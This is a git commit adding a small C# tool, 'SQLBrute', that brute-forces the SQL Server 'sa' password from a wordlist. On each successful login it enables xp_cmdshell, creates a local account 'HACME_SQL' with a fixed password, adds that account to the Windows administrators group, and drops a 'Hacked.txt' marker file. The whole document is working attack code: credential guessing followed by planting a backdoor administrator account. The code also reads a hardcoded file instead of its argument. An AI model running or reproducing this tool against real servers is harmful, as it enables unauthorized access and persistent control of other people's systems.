f3aa6b04ffb1632d7d527b31f9726fe1002a481a
Shaun Vermaak <shaun.vermaak@ittelligence.com>
2023-07-23 19:14:23 +1000

    first commit

---
+++ SQLBrute/Helpers.cs
@@ -0,0 +1,59 @@
+﻿using System;
+using System.Collections.Generic;
+using System.Data;
+using System.Data.SqlClient;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+
+namespace SQLBrute
+{
+    class Helpers
+    {
+        static public bool ConnectToSQL(string server, string userName, string password)
+        {
+            string connectionString = null;
+            Object returnValue;
+            SqlConnection cnn;
+            SqlCommand cmd = new SqlCommand();
+
+            connectionString = "Data Source='" + server + "';User ID='" + userName + "';Password='" + password + "'";
+            cnn = new SqlConnection(connectionString);
+            try
+            {
+                cnn.Open();
+                cmd.CommandText = "EXEC sp_configure 'show advanced options', 1;RECONFIGURE;exec SP_CONFIGURE 'xp_cmdshell', 1;RECONFIGURE;";
+                cmd.CommandType = CommandType.Text;
+                cmd.Connection = cnn;
+                returnValue = cmd.ExecuteScalar();
+
+                cmd.CommandText = "RECONFIGURE;";
+                cmd.CommandType = CommandType.Text;
+                cmd.Connection = cnn;
+                returnValue = cmd.ExecuteScalar();
+
+                cmd.CommandText = "xp_cmdshell 'net user HACME_SQL Password1 /ADD'";
+                cmd.CommandType = CommandType.Text;
+                cmd.Connection = cnn;
+                returnValue = cmd.ExecuteScalar();
+
+                cmd.CommandText = "xp_cmdshell 'net localgroup administrators HACME_SQL /ADD'";
+                cmd.CommandType = CommandType.Text;
+                cmd.Connection = cnn;
+                returnValue = cmd.ExecuteScalar();
+
+                cmd.CommandText = @"xp_cmdshell 'echo HACME!!! > C:\Hacked.txt'";
+                cmd.CommandType = CommandType.Text;
+                cmd.Connection = cnn;
+                returnValue = cmd.ExecuteScalar();
+
+                cnn.Close();
+                return true;
+            }
+            catch
+            {
+                return false;
+            }
+        }
+    }
+}
---
+++ SQLBrute/Program.cs
@@ -0,0 +1,53 @@
+﻿using System;
+using System.Collections.Generic;
+using System.IO;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+
+namespace SQLBrute
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            try
+            {
+                
+
+                if (args.GetUpperBound(0) == 1)
+                {
+                    string server = args[0];
+                    string passwordFile = args[1];
+
+                    if (File.Exists(passwordFile))
+                    {
+                        System.IO.StreamReader file = new System.IO.StreamReader("Passwords.txt");
+                        string line = "";
+
+                        while ((line = file.ReadLine()) != null)
+                        {
+                            if (Helpers.ConnectToSQL(server, "sa", line))
+                            {
+                                Console.WriteLine(string.Format("Connection made to '{0}' with user sa and password '{1}'",server,line));
+                            }
+                        }
+                    }
+                    else
+                    {
+                        Console.WriteLine(string.Format("File '{0}' does not exist", passwordFile));
+                    }
+                }
+                else
+                {
+                    Console.WriteLine("Usage: SQLBrute.exe SQLSERVER PASSWORDFILE");
+                }
+            }
+            catch
+            {
+                Console.WriteLine("Usage: SQLBrute.exe SQLSERVER PASSWORDFILE");
+            }
+        }
+    }
+}
+
